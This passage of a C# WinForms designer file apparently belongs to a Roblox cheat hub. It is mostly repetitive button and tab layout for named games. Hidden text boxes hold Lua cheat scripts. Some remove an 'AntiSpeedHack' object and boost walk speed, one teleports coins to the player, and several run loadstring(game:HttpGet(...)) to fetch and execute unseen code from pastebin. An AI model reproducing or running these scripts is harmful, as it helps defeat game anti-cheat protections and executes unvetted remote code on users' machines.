            this.flatButton348.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton348.UseCustomColor = false;
            this.flatButton348.Click += new System.EventHandler(this.flatButton348_Click);
            // 
            // pictureBox217
            // 
            this.pictureBox217.Location = new System.Drawing.Point(514, 6);
            this.pictureBox217.Name = "pictureBox217";
            this.pictureBox217.Size = new System.Drawing.Size(149, 149);
            this.pictureBox217.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox217.TabIndex = 43;
            this.pictureBox217.TabStop = false;
            // 
            // richTextBox86
            // 
            this.richTextBox86.Location = new System.Drawing.Point(6, 47);
            this.richTextBox86.Name = "richTextBox86";
            this.richTextBox86.Size = new System.Drawing.Size(106, 178);
            this.richTextBox86.TabIndex = 42;
            this.richTextBox86.Text = "while wait(1) do\nworkspace:FindFirstChild(game:GetService(\"Players\").LocalPlayer." +
    "Name).AntiSpeedHack:Destroy()\ngame.Players.LocalPlayer.Character.Humanoid.WalkSp" +
    "eed = 100\nend";
            this.richTextBox86.Visible = false;
            // 
            // flatButton349
            // 
            this.flatButton349.BackColor = System.Drawing.Color.Transparent;
            this.flatButton349.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton349.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton349.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton349.Location = new System.Drawing.Point(6, 6);
            this.flatButton349.Name = "flatButton349";
            this.flatButton349.Rounded = false;
            this.flatButton349.Size = new System.Drawing.Size(106, 35);
            this.flatButton349.TabIndex = 41;
            this.flatButton349.Text = "Speed";
            this.flatButton349.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton349.UseCustomColor = false;
            this.flatButton349.Click += new System.EventHandler(this.flatButton349_Click);
            // 
            // tabPage125
            // 
            this.tabPage125.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage125.Controls.Add(this.flatButton350);
            this.tabPage125.Controls.Add(this.pictureBox218);
            this.tabPage125.Controls.Add(this.richTextBox87);
            this.tabPage125.Controls.Add(this.flatButton351);
            this.tabPage125.Location = new System.Drawing.Point(4, 44);
            this.tabPage125.Name = "tabPage125";
            this.tabPage125.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage125.Size = new System.Drawing.Size(514, 249);
            this.tabPage125.TabIndex = 120;
            this.tabPage125.Text = "Heaven Simulator";
            // 
            // flatButton350
            // 
            this.flatButton350.BackColor = System.Drawing.Color.Transparent;
            this.flatButton350.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton350.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton350.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton350.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton350.Location = new System.Drawing.Point(558, 369);
            this.flatButton350.Name = "flatButton350";
            this.flatButton350.Rounded = false;
            this.flatButton350.Size = new System.Drawing.Size(106, 35);
            this.flatButton350.TabIndex = 20;
            this.flatButton350.Text = "Home";
            this.flatButton350.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton350.UseCustomColor = false;
            this.flatButton350.Click += new System.EventHandler(this.flatButton350_Click);
            // 
            // pictureBox218
            // 
            this.pictureBox218.Location = new System.Drawing.Point(512, 6);
            this.pictureBox218.Name = "pictureBox218";
            this.pictureBox218.Size = new System.Drawing.Size(149, 149);
            this.pictureBox218.TabIndex = 19;
            this.pictureBox218.TabStop = false;
            // 
            // richTextBox87
            // 
            this.richTextBox87.Location = new System.Drawing.Point(4, 47);
            this.richTextBox87.Name = "richTextBox87";
            this.richTextBox87.Size = new System.Drawing.Size(106, 178);
            this.richTextBox87.TabIndex = 18;
            this.richTextBox87.Text = "while wait(2) do\nlocal Plr = game.Players.LocalPlayer.Character.HumanoidRootPart\n" +
    "for i,v in pairs(game.workspace.coins:GetChildren()) do \n   v.CFrame = Plr.CFram" +
    "e\n   end\nend";
            this.richTextBox87.Visible = false;
            // 
            // flatButton351
            // 
            this.flatButton351.BackColor = System.Drawing.Color.Transparent;
            this.flatButton351.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton351.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton351.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton351.Location = new System.Drawing.Point(4, 6);
            this.flatButton351.Name = "flatButton351";
            this.flatButton351.Rounded = false;
            this.flatButton351.Size = new System.Drawing.Size(106, 35);
            this.flatButton351.TabIndex = 17;
            this.flatButton351.Text = "Farm";
            this.flatButton351.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton351.UseCustomColor = false;
            this.flatButton351.Click += new System.EventHandler(this.flatButton351_Click);
            // 
            // tabPage126
            // 
            this.tabPage126.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage126.Controls.Add(this.flatButton358);
            this.tabPage126.Controls.Add(this.pictureBox226);
            this.tabPage126.Controls.Add(this.flatButton359);
            this.tabPage126.Location = new System.Drawing.Point(4, 44);
            this.tabPage126.Name = "tabPage126";
            this.tabPage126.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage126.Size = new System.Drawing.Size(514, 249);
            this.tabPage126.TabIndex = 121;
            this.tabPage126.Text = "Egg Clicker";
            // 
            // flatButton358
            // 
            this.flatButton358.BackColor = System.Drawing.Color.Transparent;
            this.flatButton358.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton358.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton358.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton358.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton358.Location = new System.Drawing.Point(558, 369);
            this.flatButton358.Name = "flatButton358";
            this.flatButton358.Rounded = false;
            this.flatButton358.Size = new System.Drawing.Size(106, 35);
            this.flatButton358.TabIndex = 23;
            this.flatButton358.Text = "Home";
            this.flatButton358.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton358.UseCustomColor = false;
            this.flatButton358.Click += new System.EventHandler(this.flatButton358_Click);
            // 
            // pictureBox226
            // 
            this.pictureBox226.Location = new System.Drawing.Point(512, 6);
            this.pictureBox226.Name = "pictureBox226";
            this.pictureBox226.Size = new System.Drawing.Size(149, 149);
            this.pictureBox226.TabIndex = 22;
            this.pictureBox226.TabStop = false;
            // 
            // flatButton359
            // 
            this.flatButton359.BackColor = System.Drawing.Color.Transparent;
            this.flatButton359.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton359.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton359.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton359.Location = new System.Drawing.Point(4, 6);
            this.flatButton359.Name = "flatButton359";
            this.flatButton359.Rounded = false;
            this.flatButton359.Size = new System.Drawing.Size(106, 35);
            this.flatButton359.TabIndex = 21;
            this.flatButton359.Text = "GUI";
            this.flatButton359.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton359.UseCustomColor = false;
            this.flatButton359.Click += new System.EventHandler(this.flatButton359_Click);
            // 
            // tabPage127
            // 
            this.tabPage127.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage127.Controls.Add(this.flatButton360);
            this.tabPage127.Controls.Add(this.pictureBox227);
            this.tabPage127.Controls.Add(this.flatButton361);
            this.tabPage127.Location = new System.Drawing.Point(4, 44);
            this.tabPage127.Name = "tabPage127";
            this.tabPage127.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage127.Size = new System.Drawing.Size(514, 249);
            this.tabPage127.TabIndex = 122;
            this.tabPage127.Text = "Thick Legends";
            // 
            // flatButton360
            // 
            this.flatButton360.BackColor = System.Drawing.Color.Transparent;
            this.flatButton360.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton360.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton360.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton360.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton360.Location = new System.Drawing.Point(558, 369);
            this.flatButton360.Name = "flatButton360";
            this.flatButton360.Rounded = false;
            this.flatButton360.Size = new System.Drawing.Size(106, 35);
            this.flatButton360.TabIndex = 26;
            this.flatButton360.Text = "Home";
            this.flatButton360.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton360.UseCustomColor = false;
            this.flatButton360.Click += new System.EventHandler(this.flatButton360_Click);
            // 
            // pictureBox227
            // 
            this.pictureBox227.Location = new System.Drawing.Point(512, 6);
            this.pictureBox227.Name = "pictureBox227";
            this.pictureBox227.Size = new System.Drawing.Size(149, 149);
            this.pictureBox227.TabIndex = 25;
            this.pictureBox227.TabStop = false;
            // 
            // flatButton361
            // 
            this.flatButton361.BackColor = System.Drawing.Color.Transparent;
            this.flatButton361.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton361.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton361.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton361.Location = new System.Drawing.Point(4, 6);
            this.flatButton361.Name = "flatButton361";
            this.flatButton361.Rounded = false;
            this.flatButton361.Size = new System.Drawing.Size(106, 35);
            this.flatButton361.TabIndex = 24;
            this.flatButton361.Text = "GUI";
            this.flatButton361.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton361.UseCustomColor = false;
            this.flatButton361.Click += new System.EventHandler(this.flatButton361_Click);
            // 
            // tabPage128
            // 
            this.tabPage128.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage128.Controls.Add(this.flatButton362);
            this.tabPage128.Controls.Add(this.pictureBox228);
            this.tabPage128.Controls.Add(this.flatButton363);
            this.tabPage128.Location = new System.Drawing.Point(4, 44);
            this.tabPage128.Name = "tabPage128";
            this.tabPage128.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage128.Size = new System.Drawing.Size(514, 249);
            this.tabPage128.TabIndex = 123;
            this.tabPage128.Text = "Thief Life Simulator";
            // 
            // flatButton362
            // 
            this.flatButton362.BackColor = System.Drawing.Color.Transparent;
            this.flatButton362.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton362.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton362.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton362.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton362.Location = new System.Drawing.Point(558, 369);
            this.flatButton362.Name = "flatButton362";
            this.flatButton362.Rounded = false;
            this.flatButton362.Size = new System.Drawing.Size(106, 35);
            this.flatButton362.TabIndex = 29;
            this.flatButton362.Text = "Home";
            this.flatButton362.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton362.UseCustomColor = false;
            this.flatButton362.Click += new System.EventHandler(this.flatButton362_Click);
            // 
            // pictureBox228
            // 
            this.pictureBox228.Location = new System.Drawing.Point(512, 6);
            this.pictureBox228.Name = "pictureBox228";
            this.pictureBox228.Size = new System.Drawing.Size(149, 149);
            this.pictureBox228.TabIndex = 28;
            this.pictureBox228.TabStop = false;
            // 
            // flatButton363
            // 
            this.flatButton363.BackColor = System.Drawing.Color.Transparent;
            this.flatButton363.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton363.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton363.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton363.Location = new System.Drawing.Point(4, 6);
            this.flatButton363.Name = "flatButton363";
            this.flatButton363.Rounded = false;
            this.flatButton363.Size = new System.Drawing.Size(106, 35);
            this.flatButton363.TabIndex = 27;
            this.flatButton363.Text = "GUI";
            this.flatButton363.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton363.UseCustomColor = false;
            this.flatButton363.Click += new System.EventHandler(this.flatButton363_Click);
            // 
            // tabPage129
            // 
            this.tabPage129.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage129.Controls.Add(this.flatButton364);
            this.tabPage129.Controls.Add(this.pictureBox229);
            this.tabPage129.Controls.Add(this.flatButton365);
            this.tabPage129.Location = new System.Drawing.Point(4, 44);
            this.tabPage129.Name = "tabPage129";
            this.tabPage129.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage129.Size = new System.Drawing.Size(514, 249);
            this.tabPage129.TabIndex = 124;
            this.tabPage129.Text = "Break In";
            // 
            // flatButton364
            // 
            this.flatButton364.BackColor = System.Drawing.Color.Transparent;
            this.flatButton364.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton364.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton364.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton364.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton364.Location = new System.Drawing.Point(558, 369);
            this.flatButton364.Name = "flatButton364";
            this.flatButton364.Rounded = false;
            this.flatButton364.Size = new System.Drawing.Size(106, 35);
            this.flatButton364.TabIndex = 32;
            this.flatButton364.Text = "Home";
            this.flatButton364.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton364.UseCustomColor = false;
            this.flatButton364.Click += new System.EventHandler(this.flatButton364_Click);
            // 
            // pictureBox229
            // 
            this.pictureBox229.Location = new System.Drawing.Point(512, 6);
            this.pictureBox229.Name = "pictureBox229";
            this.pictureBox229.Size = new System.Drawing.Size(149, 149);
            this.pictureBox229.TabIndex = 31;
            this.pictureBox229.TabStop = false;
            // 
            // flatButton365
            // 
            this.flatButton365.BackColor = System.Drawing.Color.Transparent;
            this.flatButton365.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton365.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton365.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton365.Location = new System.Drawing.Point(4, 6);
            this.flatButton365.Name = "flatButton365";
            this.flatButton365.Rounded = false;
            this.flatButton365.Size = new System.Drawing.Size(106, 35);
            this.flatButton365.TabIndex = 30;
            this.flatButton365.Text = "GUI";
            this.flatButton365.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton365.UseCustomColor = false;
            this.flatButton365.Click += new System.EventHandler(this.flatButton365_Click);
            // 
            // tabPage130
            // 
            this.tabPage130.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage130.Controls.Add(this.richTextBox101);
            this.tabPage130.Controls.Add(this.flatButton366);
            this.tabPage130.Controls.Add(this.pictureBox230);
            this.tabPage130.Controls.Add(this.flatButton367);
            this.tabPage130.Location = new System.Drawing.Point(4, 44);
            this.tabPage130.Name = "tabPage130";
            this.tabPage130.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage130.Size = new System.Drawing.Size(514, 249);
            this.tabPage130.TabIndex = 125;
            this.tabPage130.Text = "Fishing Simulator";
            // 
            // richTextBox101
            // 
            this.richTextBox101.Location = new System.Drawing.Point(5, 47);
            this.richTextBox101.Name = "richTextBox101";
            this.richTextBox101.Size = new System.Drawing.Size(104, 133);
            this.richTextBox101.TabIndex = 297;
            this.richTextBox101.Text = "loadstring(game:HttpGet((\'https://pastebin.com/raw/h9mgPtyE\')))()\n";
            this.richTextBox101.Visible = false;
            // 
            // flatButton366
            // 
            this.flatButton366.BackColor = System.Drawing.Color.Transparent;
            this.flatButton366.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton366.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton366.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton366.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton366.Location = new System.Drawing.Point(558, 369);
            this.flatButton366.Name = "flatButton366";
            this.flatButton366.Rounded = false;
            this.flatButton366.Size = new System.Drawing.Size(106, 35);
            this.flatButton366.TabIndex = 35;
            this.flatButton366.Text = "Home";
            this.flatButton366.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton366.UseCustomColor = false;
            this.flatButton366.Click += new System.EventHandler(this.flatButton366_Click);
            // 
            // pictureBox230
            // 
            this.pictureBox230.Location = new System.Drawing.Point(512, 6);
            this.pictureBox230.Name = "pictureBox230";
            this.pictureBox230.Size = new System.Drawing.Size(149, 149);
            this.pictureBox230.TabIndex = 34;
            this.pictureBox230.TabStop = false;
            this.pictureBox230.Click += new System.EventHandler(this.pictureBox230_Click);
            // 
            // flatButton367
            // 
            this.flatButton367.BackColor = System.Drawing.Color.Transparent;
            this.flatButton367.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton367.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton367.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton367.Location = new System.Drawing.Point(4, 6);
            this.flatButton367.Name = "flatButton367";
            this.flatButton367.Rounded = false;
            this.flatButton367.Size = new System.Drawing.Size(106, 35);
            this.flatButton367.TabIndex = 33;
            this.flatButton367.Text = "GUI";
            this.flatButton367.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton367.UseCustomColor = false;
            this.flatButton367.Click += new System.EventHandler(this.flatButton367_Click);
            // 
            // tabPage132
            // 
            this.tabPage132.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage132.Controls.Add(this.flatButton370);
            this.tabPage132.Controls.Add(this.pictureBox232);
            this.tabPage132.Controls.Add(this.richTextBox88);
            this.tabPage132.Controls.Add(this.flatButton371);
            this.tabPage132.Location = new System.Drawing.Point(4, 44);
            this.tabPage132.Name = "tabPage132";
            this.tabPage132.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage132.Size = new System.Drawing.Size(514, 249);
            this.tabPage132.TabIndex = 127;
            this.tabPage132.Text = "RPG Simulator";
            // 
            // flatButton370
            // 
            this.flatButton370.BackColor = System.Drawing.Color.Transparent;
            this.flatButton370.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton370.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton370.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton370.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton370.Location = new System.Drawing.Point(558, 369);
            this.flatButton370.Name = "flatButton370";
            this.flatButton370.Rounded = false;
            this.flatButton370.Size = new System.Drawing.Size(106, 35);
            this.flatButton370.TabIndex = 28;
            this.flatButton370.Text = "Home";
            this.flatButton370.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton370.UseCustomColor = false;
            this.flatButton370.Click += new System.EventHandler(this.flatButton370_Click);
            // 
            // pictureBox232
            // 
            this.pictureBox232.Location = new System.Drawing.Point(512, 6);
            this.pictureBox232.Name = "pictureBox232";
            this.pictureBox232.Size = new System.Drawing.Size(149, 149);
            this.pictureBox232.TabIndex = 27;
            this.pictureBox232.TabStop = false;
            // 
            // richTextBox88
            // 
            this.richTextBox88.Location = new System.Drawing.Point(4, 47);
            this.richTextBox88.Name = "richTextBox88";
            this.richTextBox88.Size = new System.Drawing.Size(106, 178);
            this.richTextBox88.TabIndex = 26;
            this.richTextBox88.Text = "loadstring(game:HttpGet(\"https://pastebin.com/raw/MghRgHnM\", true))()\n";
            this.richTextBox88.Visible = false;
            // 
            // flatButton371
            // 
            this.flatButton371.BackColor = System.Drawing.Color.Transparent;
            this.flatButton371.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton371.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton371.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton371.Location = new System.Drawing.Point(4, 6);
            this.flatButton371.Name = "flatButton371";
            this.flatButton371.Rounded = false;
            this.flatButton371.Size = new System.Drawing.Size(106, 35);
            this.flatButton371.TabIndex = 25;
            this.flatButton371.Text = "Farm";
            this.flatButton371.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton371.UseCustomColor = false;
            this.flatButton371.Click += new System.EventHandler(this.flatButton371_Click);
            // 
            // tabPage136
            // 
            this.tabPage136.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage136.Controls.Add(this.flatButton385);
            this.tabPage136.Controls.Add(this.pictureBox243);
            this.tabPage136.Controls.Add(this.richTextBox91);
            this.tabPage136.Controls.Add(this.flatButton386);
            this.tabPage136.Location = new System.Drawing.Point(4, 44);
            this.tabPage136.Name = "tabPage136";
            this.tabPage136.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage136.Size = new System.Drawing.Size(514, 249);
            this.tabPage136.TabIndex = 131;
            this.tabPage136.Text = "Airplane 3";
            // 
            // flatButton385
            // 
            this.flatButton385.BackColor = System.Drawing.Color.Transparent;
            this.flatButton385.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton385.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton385.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton385.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton385.Location = new System.Drawing.Point(557, 369);
            this.flatButton385.Name = "flatButton385";
            this.flatButton385.Rounded = false;
            this.flatButton385.Size = new System.Drawing.Size(106, 35);
            this.flatButton385.TabIndex = 28;
            this.flatButton385.Text = "Home";
            this.flatButton385.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton385.UseCustomColor = false;
            this.flatButton385.Click += new System.EventHandler(this.flatButton385_Click);
            // 
            // pictureBox243
            // 
            this.pictureBox243.Location = new System.Drawing.Point(514, 6);
            this.pictureBox243.Name = "pictureBox243";
            this.pictureBox243.Size = new System.Drawing.Size(149, 149);
            this.pictureBox243.TabIndex = 27;
            this.pictureBox243.TabStop = false;
            // 
            // richTextBox91
            // 
            this.richTextBox91.Location = new System.Drawing.Point(6, 47);
            this.richTextBox91.Name = "richTextBox91";
            this.richTextBox91.Size = new System.Drawing.Size(106, 178);
            this.richTextBox91.TabIndex = 26;
            this.richTextBox91.Text = "loadstring(game:HttpGet(\"https://pastebin.com/raw/BxuRTfEj\", true))()";
            this.richTextBox91.Visible = false;
            // 
            // flatButton386
            // 
            this.flatButton386.BackColor = System.Drawing.Color.Transparent;
            this.flatButton386.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton386.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton386.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton386.Location = new System.Drawing.Point(6, 6);
            this.flatButton386.Name = "flatButton386";
            this.flatButton386.Rounded = false;
            this.flatButton386.Size = new System.Drawing.Size(106, 35);
            this.flatButton386.TabIndex = 25;
            this.flatButton386.Text = "GUI";
            this.flatButton386.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton386.UseCustomColor = false;
            this.flatButton386.Click += new System.EventHandler(this.flatButton386_Click);
            // 
            // tabPage137
            // 
            this.tabPage137.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage137.Controls.Add(this.flatButton387);
            this.tabPage137.Controls.Add(this.pictureBox244);
            this.tabPage137.Controls.Add(this.flatButton388);
            this.tabPage137.Location = new System.Drawing.Point(4, 44);
            this.tabPage137.Name = "tabPage137";
            this.tabPage137.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage137.Size = new System.Drawing.Size(514, 249);
            this.tabPage137.TabIndex = 132;
            this.tabPage137.Text = "RoVille";
            // 
            // flatButton387
            // 
            this.flatButton387.BackColor = System.Drawing.Color.Transparent;
            this.flatButton387.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton387.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton387.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton387.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton387.Location = new System.Drawing.Point(557, 369);
            this.flatButton387.Name = "flatButton387";
            this.flatButton387.Rounded = false;
            this.flatButton387.Size = new System.Drawing.Size(106, 35);
            this.flatButton387.TabIndex = 32;
            this.flatButton387.Text = "Home";
            this.flatButton387.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton387.UseCustomColor = false;
            this.flatButton387.Click += new System.EventHandler(this.flatButton387_Click);
            // 
            // pictureBox244
            // 
            this.pictureBox244.Location = new System.Drawing.Point(514, 6);
            this.pictureBox244.Name = "pictureBox244";
            this.pictureBox244.Size = new System.Drawing.Size(149, 149);
            this.pictureBox244.TabIndex = 31;
            this.pictureBox244.TabStop = false;
            // 
            // flatButton388
            // 
            this.flatButton388.BackColor = System.Drawing.Color.Transparent;
            this.flatButton388.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton388.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton388.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton388.Location = new System.Drawing.Point(6, 6);
            this.flatButton388.Name = "flatButton388";
            this.flatButton388.Rounded = false;
            this.flatButton388.Size = new System.Drawing.Size(106, 35);
            this.flatButton388.TabIndex = 29;
            this.flatButton388.Text = "GUI";
            this.flatButton388.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton388.UseCustomColor = false;
            this.flatButton388.Click += new System.EventHandler(this.flatButton388_Click);
            // 
            // tabPage140
            // 
            this.tabPage140.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage140.Controls.Add(this.flatButton393);
            this.tabPage140.Controls.Add(this.pictureBox247);
            this.tabPage140.Controls.Add(this.richTextBox94);
            this.tabPage140.Controls.Add(this.flatButton394);
            this.tabPage140.Location = new System.Drawing.Point(4, 44);
            this.tabPage140.Name = "tabPage140";
            this.tabPage140.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage140.Size = new System.Drawing.Size(514, 249);
            this.tabPage140.TabIndex = 135;
            this.tabPage140.Text = "Speed Champions";
            // 
            // flatButton393
            // 
            this.flatButton393.BackColor = System.Drawing.Color.Transparent;
            this.flatButton393.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton393.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton393.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton393.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton393.Location = new System.Drawing.Point(557, 369);
            this.flatButton393.Name = "flatButton393";
            this.flatButton393.Rounded = false;
            this.flatButton393.Size = new System.Drawing.Size(106, 35);
            this.flatButton393.TabIndex = 36;
            this.flatButton393.Text = "Home";
            this.flatButton393.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton393.UseCustomColor = false;
            this.flatButton393.Click += new System.EventHandler(this.flatButton393_Click);
            // 
            // pictureBox247
            // 
            this.pictureBox247.Location = new System.Drawing.Point(514, 6);
            this.pictureBox247.Name = "pictureBox247";
            this.pictureBox247.Size = new System.Drawing.Size(149, 149);
            this.pictureBox247.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox247.TabIndex = 35;
            this.pictureBox247.TabStop = false;
            // 
            // richTextBox94
            // 
            this.richTextBox94.Location = new System.Drawing.Point(6, 47);
            this.richTextBox94.Name = "richTextBox94";
            this.richTextBox94.Size = new System.Drawing.Size(106, 178);
            this.richTextBox94.TabIndex = 34;
            this.richTextBox94.Text = "loadstring(game:HttpGet(\"https://pastebin.com/raw/fPu71e2m\", true))()";
            this.richTextBox94.Visible = false;
            // 
            // flatButton394
            // 
            this.flatButton394.BackColor = System.Drawing.Color.Transparent;
            this.flatButton394.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton394.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton394.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton394.Location = new System.Drawing.Point(6, 6);
            this.flatButton394.Name = "flatButton394";
            this.flatButton394.Rounded = false;
            this.flatButton394.Size = new System.Drawing.Size(106, 35);
            this.flatButton394.TabIndex = 33;
            this.flatButton394.Text = "GUI";
